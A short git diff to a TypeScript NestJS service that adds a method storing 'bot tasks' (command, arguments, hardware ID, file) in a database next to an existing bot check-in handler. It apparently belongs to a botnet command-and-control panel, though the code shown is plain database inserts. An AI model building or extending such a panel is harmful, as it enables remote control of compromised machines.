@@ -1,6 +1,7 @@
 import { Injectable, Logger } from '@nestjs/common';
 import { PrismaService } from 'prisma/prisma.service';
 import { BotCheckinDto } from './dto/bot-checkin.dto';
+import { PanelSendBotTaskDto } from './dto/panel-send-bot-task.dto';
 
 
 @Injectable()
@@ -95,6 +96,27 @@ export class PattayaMessagesService {
         } catch (error) {
             this.logger.error(`Something wrong`, error)
             return 0
+        }
+      }
+
+      async stampTask(task: PanelSendBotTaskDto){
+        try {
+
+            this.logger.log(`inseret new task, CREATED`)
+            await this.prisma.task.create({
+                data: {
+                    arguments: task.arguments,
+                    command: task.command,
+                    hwid: task.hwid,
+                    taskId: task.taskId,
+                    file: task.file
+                }
+            })
+
+            return true;
+        } catch (error) {
+            this.logger.error(`Something wrong`, error)
+            return false;
         }
       }
 }
